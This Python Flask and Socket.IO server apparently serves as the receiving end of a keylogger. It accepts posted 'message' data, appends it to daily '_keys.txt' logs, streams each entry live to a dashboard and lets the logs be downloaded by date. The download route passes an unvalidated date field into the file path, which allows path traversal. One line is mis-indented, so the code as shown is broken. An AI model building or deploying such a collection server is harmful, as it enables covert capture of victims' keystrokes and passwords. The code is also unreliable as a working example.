from io import BytesIO
from flask import Flask, request, render_template, send_file, redirect, url_for, Response
from flask_socketio import SocketIO, emit
from datetime import date

app = Flask(__name__)
socketio = SocketIO(app, async_mode='threading')

data=""
file_name=f"{str(date.today())}_keys.txt"
error_file=""

@app.route('/', methods=['GET', 'POST'])
def index():
    global data, error_file
    error = error_file
    error_file = ""
    if request.method == 'POST':
        send_data = request.get_json()
        with open(file_name, "a+") as file:
            file.write(send_data["message"])
                socketio.emit('new_data', send_data["message"])
        
        return 'Data received', 200

    try:
        with open(file_name, "r") as file:
            data=file.read()
    except:
        data=""
    return render_template('index.html', data=data, error=error)

@app.route('/download', methods=[ 'POST'])
def download():
    global error_file
    if request.form:
        date=request.form.get("date")
        try:
            if date:
                file_name_new=f"{date}_keys.txt"
                error_file=""
                return send_file(file_name_new, download_name=file_name_new, as_attachment=True)
            else:
                error_file=""
                return send_file(file_name, download_name=file_name, as_attachment=True)
        except:
            error_file="File couldn't be found"
            return redirect(url_for('index'))

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=443, debug=True, use_reloader=False, ssl_context=('cert.pem', 'key.pem'))
